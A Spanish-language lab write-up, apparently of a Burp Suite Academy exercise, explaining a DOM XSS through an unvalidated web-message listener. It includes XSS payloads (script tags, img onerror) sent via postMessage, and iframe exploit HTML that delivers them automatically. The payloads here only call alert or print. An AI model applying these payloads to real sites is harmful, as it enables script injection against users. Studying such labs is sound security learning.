ste laboratorio demuestra cómo una vulnerabilidad DOM XSS puede explotarse a través del uso de web messages. La página objetivo escucha mensajes entrantes con addEventListener y luego inserta su contenido directamente en el DOM dentro de un contenedor específico, sin ningún tipo de validación.

Desde el servidor de explotación, se carga la página vulnerable dentro de un iframe y se utiliza postMessage para enviar un payload malicioso que contiene una etiqueta img con un atributo onerror que ejecuta la función print. Esta acción demuestra cómo el uso inseguro de web messages puede comprometer la seguridad del sitio cuando el contenido recibido se trata como si fuera seguro.

-----

Hay un script como se muestra a continuacion:

```javascript
<script>

window.addEvenListener('message', function(e){
    document.getElementById('ads').innerHTML = e.data;
})
</script>
```

Buscamos PostMessage() javascript, al parecer es lo que se esta empleando, en la consola, ponemos lo siguiiente:

postMessage("Hola Probando")

Y se interpreta dentro de la pagina, podemos probar con inyeccion XSS:

postMessage("<script>alert(1)</script>")
postMessage("<img src=1 onerror=alert(1)>")

Entonces para hacer que el usuario, cargue esa instruccion automaticamente, hacemos lo siguiente desde el server:

```html
<iframe width=600px height=600px src="https://burpsuite.com" onload='this.contentWindow.postMessage("Hola Probando","*")'></iframe>

<iframe width=600px height=600px src="https://burpsuite.com" onload='this.contentWindow.postMessage("<img src=1 onerror=alert(1)>","*")'></iframe>

<iframe width=600px height=600px src="https://burpsuite.com" onload='this.contentWindow.postMessage("<img src=1 onerror=print()>","*")'></iframe>
```